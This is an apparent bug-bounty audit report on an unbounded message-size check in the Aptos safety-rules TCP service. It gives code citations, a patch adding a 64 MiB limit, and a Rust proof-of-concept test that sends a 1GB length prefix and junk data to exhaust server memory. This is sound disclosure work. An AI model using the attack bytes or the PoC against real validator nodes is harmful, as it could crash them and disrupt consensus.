# Audit Report

## Title
Memory Exhaustion Attack via Unbounded Message Size in Safety-Rules Network Layer

## Summary
The safety-rules remote service accepts network messages with no upper bound validation on message size, allowing an attacker to send up to ~4GB messages that cause memory exhaustion and validator node OOM crashes, potentially disrupting consensus.

## Finding Description

The vulnerability exists in the network message handling layer used by safety-rules when configured in remote Process mode. The attack path is:

1. **Entry Point**: When safety-rules is configured with `SafetyRulesService::Process`, it starts a TCP server via `NetworkServer` [1](#0-0) 

2. **Message Reception**: The server receives messages through `NetworkServer::read()` which delegates to `NetworkStream::read_buffer()` [2](#0-1) 

3. **Unbounded Size Read**: In `NetworkStream::read_buffer()`, the function reads a 4-byte length prefix and interprets it as a message size with NO validation [3](#0-2) 

4. **Memory Allocation Bomb**: The code then allocates a `Vec` of the claimed size without any upper bound check [4](#0-3) 

5. **Double Memory Usage**: The internal buffer accumulates the full message, then another allocation is made for the return value, effectively doubling memory consumption per message.

6. **Deserialization Overhead**: The large message is passed to `serde_json::from_slice()` which may consume additional memory during parsing [5](#0-4) 

**Attack Scenario:**
An attacker connects to an exposed safety-rules TCP port and sends:
- 4 bytes: `[0x00, 0x00, 0x00, 0x80]` (2GB in little-endian)
- Followed by 2GB of data (can be junk or crafted JSON)

The server accumulates 2GB in its internal buffer, allocates another 2GB Vec to return, then attempts JSON deserialization on 2GB of data. Multiple concurrent connections amplify the attack, leading to OOM.

**Contrast with Write Protection**: The `write()` function explicitly validates against `u32::MAX` [6](#0-5) , but `read()` has no such protection.

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: HIGH** per Aptos bug bounty criteria ("Validator node slowdowns" and "API crashes").

**Primary Impact:**
- **Validator OOM Crash**: Memory exhaustion forces the safety-rules process to crash or become unresponsive
- **Consensus Disruption**: Safety-rules is critical for consensus safety - its failure prevents the validator from participating in voting
- **Liveness Impact**: If multiple validators are attacked simultaneously, consensus liveness could be degraded

**Attack Amplification:**
- Each attacker connection can consume up to 4GB+ of memory
- Multiple concurrent connections multiply the impact
- No authentication on the TCP connection means any network peer can attack

**Mitigating Factor:**
Mainnet validators are explicitly prohibited from using remote safety-rules mode [7](#0-6) . However, the vulnerability still affects:
- Testnet validators
- Development/staging environments  
- Misconfigured validators
- Non-mainnet deployments

## Likelihood Explanation

**Likelihood: MEDIUM-LOW on mainnet, HIGH on testnets**

**Factors Increasing Likelihood:**
1. **No Authentication**: The TCP connection has no authentication mechanism - anyone who can reach the port can send malicious messages
2. **Simple Attack**: The exploit requires only basic TCP socket programming
3. **Default Configuration Risk**: Test configurations show `server_address: "/ip4/127.0.0.1/tcp/5555"` [8](#0-7) , but if misconfigured to bind to `0.0.0.0`, the service becomes externally accessible

**Factors Decreasing Likelihood:**
1. **Mainnet Protection**: Config sanitizer enforces local-only mode on mainnet [7](#0-6) 
2. **Default Thread Mode**: Thread-based safety-rules explicitly binds to localhost only [9](#0-8) 
3. **Network Isolation**: Production validators typically have strict firewall rules

## Recommendation

Implement a maximum message size limit in `NetworkStream::read_buffer()` consistent with other network protocols:

```rust
// In secure/net/src/lib.rs, add constant at top of file:
const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB, consistent with P2P network

fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // ADD THIS CHECK:
    if data_size > MAX_MESSAGE_SIZE {
        // Clear buffer and return empty to force connection reset
        self.buffer.clear();
        return Vec::new();
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

**Additional Recommendations:**
1. Add authentication to safety-rules network connections (e.g., mutual TLS or Noise protocol)
2. Enhance config validation to detect and warn about externally-exposed safety-rules services
3. Document the security implications of remote safety-rules deployment

## Proof of Concept

```rust
// File: consensus/safety-rules/tests/memory_exhaustion_attack.rs
use std::net::TcpStream;
use std::io::Write;
use aptos_config::utils;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use consensus_safety_rules::remote_service;
use consensus_safety_rules::persistent_safety_storage::PersistentSafetyStorage;
use aptos_secure_storage::Storage;
use std::thread;
use std::time::Duration;

#[test]
#[ignore] // Requires significant memory allocation - run manually
fn test_memory_exhaustion_attack() {
    // Setup safety-rules server
    let storage = Storage::InMemoryStorage(aptos_secure_storage::InMemoryStorage::new());
    let persistent_storage = PersistentSafetyStorage::new(storage);
    
    let server_port = utils::get_available_port();
    let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
    
    // Start server in background thread
    thread::spawn(move || {
        remote_service::execute(persistent_storage, server_addr, 30_000);
    });
    
    // Wait for server to start
    thread::sleep(Duration::from_millis(100));
    
    // Attack: Send message claiming to be 1GB
    let mut attacker_stream = TcpStream::connect(server_addr).unwrap();
    
    // Send 4-byte length prefix: 1GB (0x40000000 in little-endian)
    let malicious_size: u32 = 1_073_741_824; // 1GB
    attacker_stream.write_all(&malicious_size.to_le_bytes()).unwrap();
    
    // Send actual data (1KB to start - server will wait for full 1GB)
    let junk_data = vec![0u8; 1024];
    attacker_stream.write_all(&junk_data).unwrap();
    
    // Server is now waiting to accumulate 1GB of data
    // Multiple such connections would exhaust memory
    
    // Monitor: Check that server process memory usage grows as we send more data
    for _ in 0..10 {
        let chunk = vec![0u8; 10 * 1024 * 1024]; // 10MB chunks
        if attacker_stream.write_all(&chunk).is_err() {
            break; // Server likely crashed or timed out
        }
        thread::sleep(Duration::from_millis(100));
    }
    
    println!("Attack completed - server should show high memory usage");
}
```

## Notes

**Important Context:**
- The vulnerability is **real and exploitable**, but its practical impact depends on deployment configuration
- Mainnet validators are protected by config sanitization that enforces local-only safety-rules
- The P2P network layer has `MAX_MESSAGE_SIZE = 64 MiB` protection [10](#0-9) , but the safety-rules TCP layer lacks this
- While Thread mode is safe (localhost-only binding), Process mode allows configurable addresses that could be externally exposed in non-mainnet environments

**Risk Assessment:**
This represents a defense-in-depth failure where the safety-rules network layer lacks basic resource limits present in other network protocols within the same codebase.

### Citations

**File:** consensus/safety-rules/src/remote_service.rs (L30-44)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** secure/net/src/lib.rs (L460-463)
```rust
        let u32_max = u32::MAX as usize;
        if u32_max <= data.len() {
            return Err(Error::DataTooLarge(data.len()));
        }
```

**File:** secure/net/src/lib.rs (L484-486)
```rust
        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;
```

**File:** secure/net/src/lib.rs (L493-493)
```rust
        let returnable_data = remaining_data[..data_size].to_vec();
```

**File:** consensus/safety-rules/src/serializer.rs (L45-46)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/test_data/validator.yaml (L14-16)
```yaml
        service:
            type: process
            server_address: "/ip4/127.0.0.1/tcp/5555"
```

**File:** consensus/safety-rules/src/thread.rs (L29-31)
```rust
    pub fn new(storage: PersistentSafetyStorage, timeout: u64) -> Self {
        let listen_port = utils::get_available_port();
        let listen_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), listen_port);
```

**File:** config/src/config/network_config.rs (L50-50)
```rust
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```
